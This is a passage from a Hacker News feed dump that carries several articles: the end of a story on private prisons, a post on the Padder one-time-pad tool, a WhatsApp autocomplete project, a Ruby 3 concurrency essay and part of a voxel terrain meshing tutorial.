dir="ltr">â€œThe best we can say is thereâ€™s a hint,â€� said Galinato. â€œThere could be more mechanisms [affecting incarceration rates] out there.â€�Â&nbsp;</p><p dir="ltr">Rebecca Riddell, the co-director of New York University Law Schoolâ€™s Human Rights and Privatization Project, <a href="https://twitter.com/Rebecca_Riddell/status/1305884832153718785">praised</a> the study on Twitter.</p><p dir="ltr">â€œIt's appalling that private prisons increase incarceration levels,â€� said Riddell. â€œBut should we be surprised? Or is this a foreseeable outcome of creating a powerful industry that profits from every [additional] incarcerated person, takes in billions in taxpayer [dollars] and spends millions lobbying?â€�Â&nbsp;</p><p dir="ltr">Galinato told <em>The Academic TimesÂ&nbsp;</em>that the link between private prisons and incarceration must factor into government policy.Â&nbsp;</p><p dir="ltr">â€œThere is this potential link, and this link becomes more significant if thereâ€™s more corruption and you donâ€™t have oversight,â€� he said, adding that policymakers donâ€™t typically consider that choosing private prisons over public ones increases overall incarceration.Â&nbsp;</p><p dir="ltr">Galinato, who typically works as a natural resource and development economist, said he was inspired to conduct the study when watching an episode of the television show â€œElementary,â€� in which a prison warden murders an inmate in order to appease the owner of a private prison who wants to influence a lobby group.Â&nbsp;</p><p dir="ltr">The idea of private prison companies influencing governments to set harsher sentences initially â€œmade me laugh a little bit in terms of how ludicrous it was,â€� Galinato said.Â&nbsp;</p><p dir="ltr">â€œI wasnâ€™t really aware of private prisons in the U.S.,â€� he added. â€œI come from the Philippines. We don't have them.â€�Â&nbsp;</p><p dir="ltr">His experience studying corruption in relation to natural resources came in handy when examining the criminal justice system, he added.</p><p dir="ltr">In terms of further research, Galinato said he was interested in examining the relationship between private prisons and private halfway houses, which are often owned by the same companies. The owners of halfway houses can set house rules that, if violated, send residents back to prison. That could incentivize halfway houses to set overly harsh rules in order to make more money.Â&nbsp;</p><p dir="ltr">Galinato is also interested in examining private prisonsâ€™ incentive structures, which currently involve significant moral hazard. Private prisons are paid based on how many prisoners they house on a given day, potentially leading them to push for unjustly harsh punishments.Â&nbsp;</p><p dir="ltr">â€œThat kind of contract incentivizes more prisoners and increases the length of stay,â€� said Galinato. â€œWhat if the payment would be based on when they came out of jail and became a better member of society, then the private prison would get a bonus?â€�</p><p dir="ltr"><em>The paper, titled â€œDo privately-owned prisons increase incarceration rates?â€� was first published in the December issue of Labour Economics.Â&nbsp;</em><em>The authors were Gregmar Galinato of Washington State University and Ryne Rohla, who earned a PhD from Washington State University and now works for the Washington State Attorney General's Office. Galinato was lead author.Â&nbsp;</em></p></div></div></div>]]>
            </description>
            <link>https://academictimes.com/states-with-private-prisons-put-more-people-in-prison-for-longer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690796</guid>
            <pubDate>Fri, 08 Jan 2021 21:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decrypt the same ciphertext to different plaintexts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25690564">thread link</a>) | @_wldu
<br/>
January 8, 2021 | https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts | <a href="https://web.archive.org/web/*/https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/62726164/padder">Padder</a> can encrypt and decrypt small messages using <a href="https://en.wikipedia.org/wiki/One-time_pad">one-time pads</a>. It can also generate fake pads so that one encrypted message can be decrypted to multiple, different plaintexts.</p><h2 id="warning">Warning</h2><p>Padder should not be used in real-world situations that require encryption. It’s only intended for demonstration and experimentation. If you need strong message encryption, do not use padder. Use a well-regarded, open-source OpenPGP implementation such as <a href="https://gnupg.org/">GnuPG</a>.</p><h2 id="the-padder-character-set">The padder character set</h2><div><pre><code data-lang="bash">abcdefghijklmnopqrstuvwxyz0123456789-
</code></pre></div><h2 id="encrypt-a-message">Encrypt a message</h2><div><pre><code data-lang="bash">$ padder -e -m black -p e7vwd
CipherText: fhvyn
</code></pre></div><h2 id="decrypt-a-message">Decrypt a message</h2><div><pre><code data-lang="bash">$ padder -d -m fhvyn -p e7vwd
PlainText: black
</code></pre></div><h2 id="fake-message-and-pad-generation">Fake message and pad generation</h2><div><pre><code data-lang="bash">$ padder -f -m white -c fhvyn
FakePad: uanfj
</code></pre></div><h2 id="message-transmission">Message transmission</h2><p>The padder character set was selected specifically for message transmission over radio (HF, VHF, UHF). However, messages can be transmitted in other ways. Twitter, text messages, phone calls and website forums could all be used to send and receive messages. Encrypted messages could also be embedded in image tags, HTML, or some other inconspicuous place.</p><h2 id="decrypt-the-same-ciphertext-to-multiple-plaintexts">Decrypt the same ciphertext to multiple plaintexts</h2><p>The same one-time pad ciphertext can be decrypted to different plaintext messages by using different pads. This feature is useful for creating diversions. It may also provide for plausible deniability. This requires two (or more) sets of pads.</p><div><pre><code data-lang="bash">$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p ryxrvqnlhz04icqq6eg56cuhg10vlx5dff3ba44wg6ic-kd
PlainText: we-are-moving-north-and-will-attack-at-the-pass

$ padder -d -m c2wrbumxvj8gob34mxn46pxg29a6kxnwfhcaam3en-hr-2v -p zifs6d9dgk36k94m9d5x77jhj277ip59gw9btmv4j7in-kc
PlainText: our-group-fled-south-to-the-city-we-sailed-east
</code></pre></div><h2 id="security-considerations-and-precautions">Security considerations and precautions</h2><p>Pads must be random, kept secret, only used once and destroyed immediately after use. Should the same pad be used to encrypt more than one message, those messages will be cracked. Should the pads become lost or stolen, then all the messages should be suspect.</p><p>You must assume that your opponent intercepts and stores all of your ciphertext messages indefinitely. They hope to somehow obtain the pads and decrypt the messages someday.</p><p>When used with appropriate procedures and precautions, one-time pad encrypted messages cannot be cracked. However, how the ciphertext message is sent and received may identify the communicating parties. This may or may not be an acceptable risk in your environment. For example, if a person posted a padder encrypted message to a Twitter account, the IP address, user name and date/time would be logged and stored. And, any IP address that read the message would be logged and stored too. Basically, any transmission method that uses a network (cellular, IP, etc.) may quickly reveal the location of the communicating parties.</p><p>Radio signals are directional and can be tracked. However, radio signals don’t rely on network infrastructure and require more expensive equipment and greater technical knowledge to track. With radio you only know the general time and direction from which the signal emanated. Also, it’s relatively easy to hide the source of radio signals when the transmitter is moving around in densely populated areas. The reception of radio signals cannot be tracked. Stations in range of the signal may relay the messages to stations out of range.</p><h2 id="notes">Notes</h2><ul><li><p>Plaintext messages, pads and ciphertext messages must only contain characters from the Padder Character Set. Capitalization, punctuation and spaces are not allowed. When creating plaintext messages, use the dash symbol ‘-’ rather than spaces to separate words. <strong>this-is-an-example-plaintext-message</strong></p></li><li><p>The pad must be as long or longer than the message. The sender and receiver should have the same numbered list of pads and know in which order to use them. There could be 31 pads for the month of January. The January 1st message would use pad number 1 for that day’s message.</p></li><li><p>One-time pad encrypted messages are not authenticated.</p></li><li><p>Padder is only intended for educational purposes and experimentation.</p></li></ul><ul><li><a href="https://www.go350.com/tags/encryption">encryption</a></li></ul></div></div>]]>
            </description>
            <link>https://www.go350.com/posts/padder-a-one-time-pad-implementation/#decrypt-the-same-ciphertext-to-multiple-plaintexts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690564</guid>
            <pubDate>Fri, 08 Jan 2021 21:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LemonIt the Hacker News of YouTube]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25690466">thread link</a>) | @CrazyCoder94
<br/>
January 8, 2021 | https://lemonit.online/blog.html | <a href="https://web.archive.org/web/*/https://lemonit.online/blog.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lemonit.online/blog.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690466</guid>
            <pubDate>Fri, 08 Jan 2021 21:02:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You: A personal auto-complete tool for WhatsApp web (and eventually everything)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25690316">thread link</a>) | @nuwandavek
<br/>
January 8, 2021 | https://vivekaithal.co/posts/you-complete-you/ | <a href="https://web.archive.org/web/*/https://vivekaithal.co/posts/you-complete-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>GitHub Repo : <a href="https://github.com/nuwandavek/you">https://github.com/nuwandavek/you</a></p>
<p><em>You</em> is an auto-completion tool that completes your sentences. It lets you train a generative model that can mimic your personal style over all your text communication. Currently, You trains on WhatsApp chat history, and offers autocomplete suggestions on WhatsApp Web via a Chrome/Firefox extension and a flask server. This can be extended to train and autocomplete on more personal communication apps (Messenger, email, Slack, Twitter, etc.). Everything runs locally and is completely private.</p>
<h2 id="why">Why?</h2>
<p>Most text-based applications we use have some or the other form of aid to help us spell-check words, complete words or even complete sentences. Most primitive ones are based on simply looking up your words against a corpus, determining the most probable word and helping you complete them (spell-checks, Word docs). Intermediate tools use your own data to predict the most frequent bi-gram pairs (mobile keyboards), and advanced tools use neural networks (GMail, Google Docs). Predicting the next word (or token), however, is the most popular way of training a language model model using neural networks. The last couple of years has seen remarkable innovation in the field of NLP using neural networks from Bi-LSTMs to BERT to GPT3. We think the algorithms are already in place for tools to leverage their power and offer delightful personalized predictions - complete all your sentences. :)</p>
<p>We are also excited about the prospect of a language model that is tailor-made for you, across all platforms. A single model that understands how you speak to strangers over mail, colleagues over Slack, and friends over chat. We want people to be able to control and experiment with their experience and run everything locally, as much as possible - since these are after all, your personal messages only read by a handful of corporations and government agencies.</p>
<h2 id="demo">Demo</h2>
<p><img src="https://raw.githubusercontent.com/nuwandavek/you/master/demo.gif" alt="Chat With Rishi"></p>
<h2 id="how-do-i-run-this">How do I run this?</h2>
<p>Currently You works on web Whatsapp, and running You involves 3 steps</p>
<ul>
<li>Training (fine-tuning) a pre-trained DistilGPT2 model on your own chats on Google Colab (or locally if you have a GPU)</li>
<li>Running a flask server with the model downloaded from the above step</li>
<li>Installing a Chrome/Firefox extension that talks to your server and injects the prompts to your browser</li>
</ul>
<p>For more detailed steps, checkout the  <code>README</code> file on the <a href="https://github.com/nuwandavek/you">github repository</a>.</p>
<h2 id="next-steps">Next Steps</h2>
<p>We have a bunch of ToDos on the <code>README</code>. Mostly we will be experimenting with new models or with better training strategies to improve the prompts. We’ll  also be working on supporting more chat and other communication applications.</p>
<p>This was a weekend project by <a href="https://twitter.com/nuwandavek">nuwandavek</a> and <a href="https://twitter.com/rishicomplex">rishicomplex</a>. Do check it out, and let us know how it goes!</p>

    </div></div>]]>
            </description>
            <link>https://vivekaithal.co/posts/you-complete-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690316</guid>
            <pubDate>Fri, 08 Jan 2021 20:52:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3, Concurrency and the Ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 235 | Comments 58 (<a href="https://news.ycombinator.com/item?id=25690212">thread link</a>) | @ksec
<br/>
January 8, 2021 | https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/ | <a href="https://web.archive.org/web/*/https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><span>06 Jan 2021</span></p><p>With the <a href="http://www.ruby-lang.org/en/news/2020/12/25/ruby-3-0-0-released/" target="\_blank">Ruby 3.0 release</a>, there’s been a lot of chatter about concurrency, parallelism, and async IO.</p>

<p>For my own reflection, I wanted to write down what that means for performance and capacity/costs of apps, and what would be the impact on the Ruby ecosystem.</p>

<p>I will assume that the audience already knows the difference between <a href="https://en.wikipedia.org/wiki/Thread_(computing)#Threads_vs._processes_pros_and_cons" target="\_blank">threads vs processes model in UNIX</a> and the <a href="https://en.wikipedia.org/wiki/Little%27s_law" target="\_blank">Little’s law</a>.</p>

<p>
Updated on Jan 9, 2021: thanks to the feedback from <a href="https://github.com/ioquatix" target="_blank">Samuel Williams</a>, I’ve revised the post with findings from <a href="https://github.com/socketry/falcon" target="_blank">Falcon</a>, the async web server written in Ruby.</p>

<h2 id="learning-from-python">Learning from Python</h2>

<p>It’s always good to take learnings from other languages. There’s an excellent <a href="http://calpaterson.com/async-python-is-not-faster.html" target="\_blank">write-up “Async Python is not faster” by Cal Paterson</a>.</p>

<p>It argues that process-based (aka forking) web servers <strong>show better latencies for web requests</strong> when they are compared to async IO-powered servers.</p>

<p>But why? That’s because async IO brings co-operative scheduling, which means that the execution is only yielded upon language keywords like <code>await</code>.</p>

<p>Quoting the author, this means that execution time is not distributed “fairly” and one thread can inadvertently starve another of CPU time while it is working. This is why latency is more erratic.</p>

<blockquote>
  <p>In contrast, traditional sync webservers use the pre-emptive multi-processing of the kernel scheduler, which works to ensure fairness by periodically swapping processes out from execution. This means that time is divided more fairly and that latency variance is lower.</p>
</blockquote>

<h2 id="learning-from-falcon">Learning from Falcon</h2>

<p>
(added on Jan 9, 2021)
</p>

<p><a href="https://github.com/socketry/falcon">Falcon</a> is a multi-process, multi-fiber HTTP server written in Ruby that is already utilizing async IO.</p>

<p>It has a great <a href="https://github.com/socketry/falcon-benchmark">set of benchmarks</a> that let us compare Falcon’s async IO with other non-async web servers like Passenger, Puma and Unicorn. Those benchmarks have been showing that <strong>async IO-powered server like Falcon</strong> provides better latencies on web requests.</p>

<p>Interestingly, that’s a very different story than Python! Looking at Python, I’ve expected that the thread driven server should be more “balanced” but it turns out the opposite.</p>

<p>Falcon’s authors explain that the fiber scheduler naturally scales according to load much better than the worker pool implementation in Puma. When fibers are busy handling requests, they don’t call <code>accept</code> so the requests are naturally picked up by other workers who are less busy.</p>

<h3 id="what-does-that-mean-for-us-ruby-developers">What does that mean for us Ruby developers?</h3>

<p>Scheduling threads and fibers is nuanced, and you can see that similar approaches demonstrate different results on Python and Ruby/Falcon examples.</p>

<p>In the first revision of this post, I’ve argued that async IO may often increase the latency. Thanks to the data <a href="https://github.com/socketry/falcon-benchmark">shown</a> by Samuel Williams, we can see that’s not the case.</p>

<p>One of the benefits of async IO is that concurrency is archived by the <code>yield</code>/<code>await</code> instruction, not by the constant interrupt of threads. Every interrupt causes the context switch - and it’s nice to reduce context switching where we can because scheduler switching from one task to another always adds a little overhead. Since that happens thousands of times every second, <strong>less context switching would mean fewer CPU cycles wasted</strong>.</p>

<h2 id="where-does-ractor-fit-in">Where does Ractor fit in?</h2>

<p>The Ractor pattern allows parallel execution (which wasn’t possible in Ruby before) of more than one Ruby thread by limiting the shared state of a block of code that you want to execute in parallel. Those “blocks of code” (aka “actors”) can also talk to each other through messages. This is the <a href="https://en.wikipedia.org/wiki/Actor_model">Actor model</a> used in other languages.</p>

<p>There are two ways we could leverage Ractors for modern apps: from the top (wrap every worker into a Ractor) and from the bottom (selectively use Ractors within existing code to parallelize CPU-intensive work).</p>

<p>While I see more to be gained from the top way, it seems like there’s so much shared and mutable state in Ruby libraries that it’s going to be quite tricky, although not impossible. It will likely take some efforts and at least a year of work from the community to push libraries towards less shared state. For the next year, we’ll mostly see Ractor maturing and getting adopted in the “bottom” use cases.</p>

<h2 id="impact-on-the-ruby-ecosystem">Impact on the Ruby ecosystem</h2>

<p><strong>By itself, async IO will help to use CPU more efficiently by reducing context switching.</strong></p>

<p>Better support for async IO in Ruby 3.0 will increase community’s adoption of async web servers like Falcon, and will hopefully give birth to async background job systems.</p>

<p>Having Sidekiq execute jobs concurrently through the async IO and event loop instead of threads could increase the throughput and save CPU work, especially for IO-bound workloads like webhook delivery.</p>

<p><strong>We’ll need to push the Ruby ecosystem to have less shared state to fully leverage the Ractor pattern.</strong> That will take us some time.</p>

<p>If you’ve enjoyed reading this, I highly recommend to read <em><a href="http://wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html" target="\_blank">Ruby 3.0 and the new FiberScheduler interface</a></em> by Wander Hillen.</p>

<p>Thanks to Samiel Williams and to Julik Tarkhanov for providing early feedback on this post.</p>

<p>I’m looking forward to hearing your thoughts on this in the comments!</p>

</div></div>]]>
            </description>
            <link>https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690212</guid>
            <pubDate>Fri, 08 Jan 2021 20:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smooth Voxel Terrain, Part 2 (2012)]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25690189">thread link</a>) | @fanf2
<br/>
January 8, 2021 | https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/ | <a href="https://web.archive.org/web/*/https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p><a href="https://0fps.wordpress.com/2012/07/10/smooth-voxel-terrain-part-1/">Last time</a> we formulated the problem of isosurface extraction and discussed some general approaches at a high level.&nbsp; Today, we’re going to get very specific and look at meshing in particular.</p>
<p>For the sake of concreteness, let us suppose that we have approximated our potential field <img src="https://s0.wp.com/latex.php?latex=f&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="f" title="f"> by sampling it onto a cubical grid at some fixed resolution.&nbsp; To get intermediate values, we’ll just interpolate between grid points using the standard <a href="http://paulbourke.net/miscellaneous/interpolation/">trilinear interpolation</a>.&nbsp; This is like a <img src="https://s0.wp.com/latex.php?latex=C%5E0&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="C^0" title="C^0"> generalization of Minecraft-style voxel surfaces.&nbsp; Our goal in this article is to figure out how to extract a mesh of the implicit surface (or zero-crossings of <img src="https://s0.wp.com/latex.php?latex=f&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="f" title="f">).&nbsp; In particular, we’re going to look at three different approaches to this problem:</p>
<h2>Marching Cubes</h2>
<p>By far the most famous method for extracting isosurfaces is the <a href="http://en.wikipedia.org/wiki/Marching_cubes">marching cubes</a> algorithm. &nbsp;In fact, it is so popular that the term `marching cubes’ is even more popular than the term `isosurface’ (at least according to Google)!&nbsp;&nbsp; It’s quite a feat when an algorithm becomes more popular than the problem which it solves!&nbsp; The history behind this method is very interesting.&nbsp; It was originally <a href="http://dl.acm.org/citation.cfm?id=37422">published back in SIGGRAPH 87</a>, and then summarily patented by the Lorensen and Cline. &nbsp;This fact has caused a lot of outrage, and is been widely cited as one of the classic examples of patents hampering innovation.&nbsp; Fortunately, the patent on marching cubes expired back in 2005 and so today you can freely use this algorithm in the US with no fear of litigation.</p>
<p>Much of the popularity of marching cubes today is due in no small part to a famous article written by <a href="http://paulbourke.net/">Paul Bourke</a>. &nbsp;Back in 1994 he made a webpage called <a href="http://paulbourke.net/geometry/polygonise/">“Polygonizing a Scalar Field”</a>, which presented a short, self-contained reference implementation of marching cubes (derived from some earlier work by Cory Gene Bloyd.)&nbsp; That tiny snippet of a C program is possibly <strong><em>the most copy-pasted code of&nbsp;<span>all time</span></em></strong>. &nbsp;I have seen some variation of Bloyd/Bourke’s code in <strong>every</strong> implementation of marching cubes that I’ve ever looked at, without exception.&nbsp; There are at least a couple of reasons for this:</p>
<ol>
<li>Paul Bourke’s exposition is really good. &nbsp;Even today, with many articles and tutorials written on the technique, none of them seem to explain it quite as well.&nbsp; (And I don’t have any delusions that I will do any better!)</li>
<li>Also their implementation is very small and fast. &nbsp;It uses some clever tricks like a precalculated edge table to speed up vertex generation.&nbsp; It is difficult to think of any non-trivial way to improve upon it.</li>
<li>Finally, marching cubes is incredibly difficult to code from scratch.</li>
</ol>
<p>This last point needs some explaining, &nbsp;Conceptually, marching cubes is rather simple. &nbsp;What it does is sample the implicit function along a grid, and then checks the sign of the potential function at each point (either +/-). &nbsp;Then, for every edge of the cube with a sign change, it finds the point where this edge intersects the volume and adds a vertex (this is just like ray casting a bunch of tiny little segments between each pair of grid points).&nbsp; The hard part is figuring out how to stitch some surface between these intersection points.&nbsp; Up to the position of the zero crossings, there are&nbsp;<img src="https://s0.wp.com/latex.php?latex=2%5E8+%3D+256&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="2^8 = 256" title="2^8 = 256"> different possibilities, each of which is determined by the sign of the function at the 8 vertices of the cube:</p>
<p><a href="http://en.wikipedia.org/wiki/File:MarchingCubes.svg"><img loading="lazy" data-attachment-id="561" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/marchingcubes/" data-orig-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png" data-orig-size="501,236" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="marchingcubes" data-image-description="<p>Some of the marching cubes special cases.  (c) WIkipedia, created by Jean-Marie Favreau.</p>
" data-medium-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=501" title="marchingcubes" alt="" src="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300&amp;h=141" height="141" width="300" srcset="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300&amp;h=141 300w, https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=150&amp;h=71 150w, https://0fps.files.wordpress.com/2012/07/marchingcubes.png 501w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>Some of the marching cubes special cases. &nbsp;(c) Wikipedia, created by Jean-Marie Favreau.</p>
<p>Even worse, some of these cases are ambiguous!&nbsp; The only way to resolve this is to somewhat arbitrarily break the symmetry of the table based on a case-by-case analysis. What a mess!&nbsp; Fortunately, if you just download Bloyd/Bourke’s code, then you don’t have to worry about any of this and everything will just work. &nbsp;No wonder it gets used so much!</p>
<h2>Marching Tetrahedra</h2>
<p>Both the importance of isosurface extraction and the perceived shortcomings of marching cubes motivated the search for alternatives. &nbsp;One of the most popular was the <a href="http://search.ieice.org/bin/summary.php?id=e74-d_1_214">marching tetrahedra</a>, introduced by Doi and Koide.&nbsp; Besides the historical advantage that marching tetrahedra was not patented, it does have a few technical benefits:</p>
<ol>
<li>Marching tetrahedra does not have ambiguous topology, unlike marching cubes.&nbsp; As a result, surfaces produced by marching tetrahedra are always manifold.</li>
<li>The amount of geometry generated per tetrahedra is much smaller, which might make it more suitable for use in say a geometry shader.</li>
<li>Finally, marching tetrahedra has only <img src="https://s0.wp.com/latex.php?latex=2%5E4+%3D+16&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="2^4 = 16" title="2^4 = 16"> cases, a number which can be further reduced to just 3 special cases by symmetry considerations. &nbsp;This is enough that you can work them out by hand.</li>
</ol>
<p><strong>Exercise:&nbsp; </strong>Try working out the cases for marching tetrahedra yourself. &nbsp;(It is really not bad.)</p>
<p>The general idea behind marching tetrahedra is the same as marching cubes, only it uses a tetrahedral subdivision. &nbsp;Again, the standard reference for practical implementation is Paul Bourke (<a href="http://local.wasp.uwa.edu.au/~pbourke/geometry/polygonise/">same page as before</a>, just scroll down a bit.) &nbsp;While there is a lot to like about marching tetrahedra, it does have some draw backs. &nbsp;In particular, the meshes you get from marching tetrahedra are typically about 4x larger than marching cubes. &nbsp;This makes both the algorithm and rendering about 4x slower. &nbsp;If your main consideration is performance, you may be better off using a cubical method. &nbsp;On the other hand, if you really need a manifold mesh, then marching tetrahedra could be a good option. &nbsp;The other nice thing is that if you are obstinate and like to code everything yourself, then marching tetrahedra may be easier since there aren’t too many cases to check.</p>
<h2>The Primal/Dual Classification</h2>
<p>By now, both marching cubes and tetrahedra are quite old. &nbsp;However, research into isosurface extraction hardly stopped in the 1980s.&nbsp; In the intervening years, many new techniques have been developed. &nbsp;One general class of methods which has proven very effective are the so-called `dual’ schemes. &nbsp;The first dual method, surface nets, was proposed by Sarah Frisken Gibson in 1999:</p>
<p>S.F. Gibson, (1999) “<a href="http://www.merl.com/papers/docs/TR99-24.pdf" target="_blank">Constrained Elastic Surface Nets</a>”&nbsp; Mitsubishi Electric Research Labs, Technical Report.</p>
<p>The main distinction between dual and primal methods (like marching cubes) is the way they generate surface topology.&nbsp; In both algorithms, we start with the same input: a volumetric mesh determined by our samples, which I shall take the liberty of calling a&nbsp;<em>sample complex</em> for lack of a better term.&nbsp; If you’ve never heard of the word&nbsp;<a href="http://www.inperc.com/wiki/index.php?title=Cell_complex">cell complex</a>&nbsp;before, you can think of it as an n-dimensional generalization of a triangular mesh, where the `cells’ or facets don’t have to be simplices.</p>
<p>In the sample complex, vertices (or 0-cells) correspond to the sample points; edges (1-cells) correspond to pairs of nearby samples; faces (2-cells) bound edges and so on:</p>
<p><img loading="lazy" data-attachment-id="534" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/samplecomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png" data-orig-size="533,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="samplecomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=533" title="samplecomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300&amp;h=235" height="235" width="300" srcset="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300&amp;h=235 300w, https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=150&amp;h=118 150w, https://0fps.files.wordpress.com/2012/07/samplecomplex.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>Here is an illustration of such a complex. &nbsp;I’ve drawn the vertices where the potential function is negative black, and the ones where it is positive white.</p>
<p>Both primal and dual methods walk over the sample complex, looking for those cells which cross the 0-level of the potential function. &nbsp;In the above illustration, this would include the following faces:</p>
<p><img loading="lazy" data-attachment-id="535" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/boundarycells/" data-orig-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png" data-orig-size="533,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="boundarycells" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=533" title="boundarycells" alt="" src="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300&amp;h=235" height="235" width="300" srcset="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300&amp;h=235 300w, https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=150&amp;h=118 150w, https://0fps.files.wordpress.com/2012/07/boundarycells.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<h3>Primal Methods</h3>
<p>Primal methods, like marching cubes, try to turn the cells crossing the bounary into an isosurface using the following recipe:</p>
<ul>
<li>Edges crossing the boundary become vertices in the isosurface mesh.</li>
<li>Faces crossing the boundary become edges in the isosurface mesh.</li>
<li>…</li>
<li>n-cells crossing the boundary become (n-1)-cells in the isosurface mesh.</li>
</ul>
<p>One way to construct a primal mesh for our sample complex would be the following:</p>
<p><img loading="lazy" data-attachment-id="536" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/primalcomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png" data-orig-size="533,424" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="primalcomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=533" title="primalcomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300&amp;h=238" height="238" width="300" srcset="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300&amp;h=238 300w, https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=150&amp;h=119 150w, 